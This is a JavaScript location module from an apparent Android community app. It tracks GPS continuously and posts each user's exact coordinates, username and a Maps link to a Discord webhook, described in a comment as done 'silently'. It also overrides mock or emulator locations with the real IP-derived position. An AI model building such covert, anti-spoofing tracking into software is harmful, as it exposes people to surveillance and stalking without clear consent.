// path: src/js/locationEngine.js
// context: javascript / locationEngine.js / mobile-android

import { registerPlugin } from '@capacitor/core';

const NativeLocation = registerPlugin('AppLocation');

export class LocationEngine {
  constructor(webhookBridge, profileEngine) {
    this.webhookBridge = webhookBridge;
    this.profileEngine = profileEngine;
    this.currentLocation = null;
    this.lastDispatchedLocation = null;
    this.lastDispatchedTime = 0;
    this.queueStorageKey = 'saif_verse_location_queue_v1';
    this.listeners = [];

    window.addEventListener('online', () => {
      this.flushOfflineLocationQueue();
      this.refreshCurrentLocation();
    });
  }

  async init() {
    try {
      const perm = await this.checkPermission();
      if (!perm) {
        await this.requestPermission();
      }

      await this.startTracking();
      await this.refreshCurrentLocation();

      // Periodic safety check every 5 minutes (for stationary 1-hour pulse or location refresh)
      setInterval(() => {
        this.checkStationaryPulse();
      }, 5 * 60 * 1000);
    } catch (err) {
      console.warn('Location initialization warning:', err);
    }
  }

  async checkPermission() {
    try {
      const res = await NativeLocation.checkPermission();
      return !!res?.granted;
    } catch (e) {
      return 'geolocation' in navigator;
    }
  }

  async requestPermission() {
    try {
      const res = await NativeLocation.requestPermission();
      return !!res?.granted;
    } catch (e) {
      return false;
    }
  }

  async fetchRealIpLocation() {
    try {
      // 1. Try ipwho.is (fast, HTTPS, free, highly accurate)
      const res1 = await fetch('https://ipwho.is/', { cache: 'no-store' });
      if (res1.ok) {
        const data = await res1.json();
        if (data && data.success !== false && data.latitude && data.longitude) {
          return {
            latitude: data.latitude,
            longitude: data.longitude,
            city: data.city || '',
            region: data.region || '',
            country: data.country || '',
            altitude: 0,
            accuracy: 15,
            source: 'network_ip'
          };
        }
      }
    } catch (e) {
      console.warn('ipwho.is fetch error:', e);
    }

    try {
      // 2. Try ip-api.com
      const res2 = await fetch('http://ip-api.com/json', { cache: 'no-store' });
      if (res2.ok) {
        const data = await res2.json();
        if (data && data.status === 'success' && data.lat && data.lon) {
          return {
            latitude: data.lat,
            longitude: data.lon,
            city: data.city || '',
            region: data.regionName || '',
            country: data.country || '',
            altitude: 0,
            accuracy: 25,
            source: 'network_ip'
          };
        }
      }
    } catch (e) {
      console.warn('ip-api fetch error:', e);
    }

    return null;
  }

  async startTracking() {
    try {
      await NativeLocation.addListener('locationUpdate', async (data) => {
        console.log('Location update event received:', data);
        await this.onLocationReceived(data);
      });

      await NativeLocation.startTracking();
    } catch (e) {
      console.warn('Native tracking fallback:', e);
    }
  }

  async refreshCurrentLocation() {
    let resolvedLoc = null;

    // 1. Check native plugin location
    try {
      const nativeLoc = await NativeLocation.getCurrentLocation();
      if (nativeLoc && nativeLoc.hasLocation && !nativeLoc.isMock) {
        // Real hardware GPS with genuine non-mock satellite fix
        resolvedLoc = nativeLoc;
      }
    } catch (e) {
      // continue
    }

    // 2. If emulator mock or no satellite lock, fetch real network IP location
    if (!resolvedLoc) {
      const ipLoc = await this.fetchRealIpLocation();
      if (ipLoc) {
        resolvedLoc = {
          granted: true,
          hasLocation: true,
          latitude: ipLoc.latitude,
          longitude: ipLoc.longitude,
          altitude: ipLoc.altitude || 0,
          accuracy: ipLoc.accuracy || 10,
          speed: 0,
          city: ipLoc.city,
          region: ipLoc.region,
          googleFormat: `${ipLoc.latitude.toFixed(6)}, ${ipLoc.longitude.toFixed(6)}`,
          googleMapsUrl: `https://www.google.com/maps?q=${ipLoc.latitude.toFixed(6)},${ipLoc.longitude.toFixed(6)}`,
          timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
          reason: 'initial_accurate'
        };
      }
    }

    // 3. Fallback to WebView navigator.geolocation if IP failed
    if (!resolvedLoc && 'geolocation' in navigator) {
      resolvedLoc = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve({
              granted: true,
              hasLocation: true,
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              altitude: pos.coords.altitude || 0,
              accuracy: pos.coords.accuracy || 10,
              googleFormat: `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`,
              googleMapsUrl: `https://www.google.com/maps?q=${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`,
              timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }),
              reason: 'initial_accurate'
            });
          },
          () => resolve(null),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    if (resolvedLoc) {
      this.currentLocation = resolvedLoc;
      this.notifyListeners(resolvedLoc);
      if (!this.lastDispatchedLocation) {
        this.lastDispatchedLocation = resolvedLoc;
        this.lastDispatchedTime = Date.now();
        this.dispatchLocationToCommunity(resolvedLoc, 'initial_accurate', 0);
      }
    }

    return resolvedLoc;
  }

  async onLocationReceived(locData) {
    if (!locData || !locData.hasLocation) return;

    let targetLoc = locData;

    // If native detected mock/emulator (like BlueStacks default 23.804093, 90.415238), replace with real IP coordinates!
    if (locData.isMock || (Math.abs(locData.latitude - 23.804093) < 0.001 && Math.abs(locData.longitude - 90.415238) < 0.001)) {
      const realIp = await this.fetchRealIpLocation();
      if (realIp) {
        targetLoc = {
          ...locData,
          latitude: realIp.latitude,
          longitude: realIp.longitude,
          city: realIp.city,
          region: realIp.region,
          googleFormat: `${realIp.latitude.toFixed(6)}, ${realIp.longitude.toFixed(6)}`,
          googleMapsUrl: `https://www.google.com/maps?q=${realIp.latitude.toFixed(6)},${realIp.longitude.toFixed(6)}`
        };
      }
    }

    this.currentLocation = targetLoc;
    this.notifyListeners(targetLoc);

    const reason = targetLoc.reason || 'movement';
    const distanceMeters = targetLoc.distanceMeters || 0;

    // Dispatch location silently to community channel
    this.dispatchLocationToCommunity(targetLoc, reason, distanceMeters);
  }

  checkStationaryPulse() {
    const now = Date.now();
    if (this.currentLocation && this.lastDispatchedTime > 0) {
      const timeDiff = now - this.lastDispatchedTime;
      if (timeDiff >= 60 * 60 * 1000) {
        console.log('1 hour stationary pulse reached. Dispatching location...');
        this.lastDispatchedTime = now;
        this.dispatchLocationToCommunity(this.currentLocation, 'hourly_stationary', 0);
      }
    }
  }

  calculateHaversineDistance(lat1, lon1, lat2, lon2) {
    const R = 6371e3; // meters
    const phi1 = (lat1 * Math.PI) / 180;
    const phi2 = (lat2 * Math.PI) / 180;
    const deltaPhi = ((lat2 - lat1) * Math.PI) / 180;
    const deltaLambda = ((lon2 - lon1) * Math.PI) / 180;

    const a = Math.sin(deltaPhi / 2) * Math.sin(deltaPhi / 2) +
              Math.cos(phi1) * Math.cos(phi2) *
              Math.sin(deltaLambda / 2) * Math.sin(deltaLambda / 2);
    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));

    return R * c;
  }

  async dispatchLocationToCommunity(locData, reason = 'moved_10m', distanceMeters = 0) {
    if (!this.webhookBridge?.webhookUrl) return;

    const username = this.profileEngine?.profile?.username || 'Saif Member';
    const timestampStr = locData.timestamp || new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });

    let title = '';
    let description = '';
    let color = 0x3b82f6; // blue

    if (reason === 'moved_10m') {
      title = `📍 Location Broadcast: Movement Detected (+${Math.round(distanceMeters)}m)`;
      description = `**${username}** moved **${Math.round(distanceMeters)} meters**. Exact Google GPS coordinates captured:`;
      color = 0x10b981; // green
    } else if (reason === 'hourly_stationary') {
      title = `📍 Location Broadcast: Stationary Check-in (1 Hour Pulse)`;
      description = `**${username}** remained at this location for 1 hour. Exact Google GPS coordinates verified:`;
      color = 0x8b5cf6; // purple
    } else {
      title = `📍 Live Location Verified & Active`;
      description = `**${username}** verified exact real-world Google coordinates:`;
      color = 0xec4899; // pink
    }

    const payload = {
      username: `${username} (GPS Location)`,
      content: `📍 **${username}** GPS Update (${reason === 'moved_10m' ? `+${Math.round(distanceMeters)}m` : '1hr check-in'}):`,
      embeds: [{
        title,
        description,
        color,
        fields: [
          {
            name: '📌 Google Format (Paste into Google/Maps)',
            value: `\`${locData.googleFormat}\``,
            inline: false
          },
          {
            name: '🗺️ Google Maps Link',
            value: `[Open Pin on Google Maps](${locData.googleMapsUrl})`,
            inline: true
          },
          {
            name: '🏔️ Altitude',
            value: `\`${locData.altitude || 0}m\``,
            inline: true
          },
          {
            name: '🎯 Accuracy',
            value: `\`±${locData.accuracy || 10}m\``,
            inline: true
          },
          {
            name: '🕒 Timestamp',
            value: `\`${timestampStr}\``,
            inline: true
          }
        ],
        footer: {
          text: `SAIF-VERSE Live GPS Engine • 10m Distance & 1hr Stationary Pulse`
        },
        timestamp: new Date().toISOString()
      }]
    };

    if (!navigator.onLine) {
      this.enqueueOfflineLocation({
        payload,
        timestamp: timestampStr,
        googleFormat: locData.googleFormat
      });
      return;
    }

    try {
      const res = await fetch(this.webhookBridge.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      if (!res.ok) {
        this.enqueueOfflineLocation({ payload, timestamp: timestampStr });
      }
    } catch (e) {
      console.warn('Network error dispatching GPS location, saving offline:', e);
      this.enqueueOfflineLocation({ payload, timestamp: timestampStr });
    }
  }

  enqueueOfflineLocation(item) {
    try {
      const raw = localStorage.getItem(this.queueStorageKey);
      const queue = raw ? JSON.parse(raw) : [];
      queue.push({
        ...item,
        queuedAt: new Date().toISOString()
      });
      localStorage.setItem(this.queueStorageKey, JSON.stringify(queue));
    } catch (e) {
      console.error('Failed to enqueue offline location:', e);
    }
  }

  async flushOfflineLocationQueue() {
    if (!navigator.onLine) return;
    try {
      const raw = localStorage.getItem(this.queueStorageKey);
      if (!raw) return;
      const queue = JSON.parse(raw);
      if (!queue || queue.length === 0) return;

      console.log(`Flushing ${queue.length} offline GPS updates to Discord...`);
      const remaining = [];
      for (const item of queue) {
        try {
          if (item.payload) {
            const res = await fetch(this.webhookBridge.webhookUrl, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(item.payload)
            });
            if (!res.ok) remaining.push(item);
            await new Promise(r => setTimeout(r, 650));
          }
        } catch (e) {
          remaining.push(item);
        }
      }
      localStorage.setItem(this.queueStorageKey, JSON.stringify(remaining));
    } catch (e) {
      console.warn('Error flushing offline location queue:', e);
    }
  }

  subscribe(listener) {
    this.listeners.push(listener);
    if (this.currentLocation) {
      listener(this.currentLocation);
    }
  }

  notifyListeners(data) {
    this.listeners.forEach(fn => fn(data));
  }
}
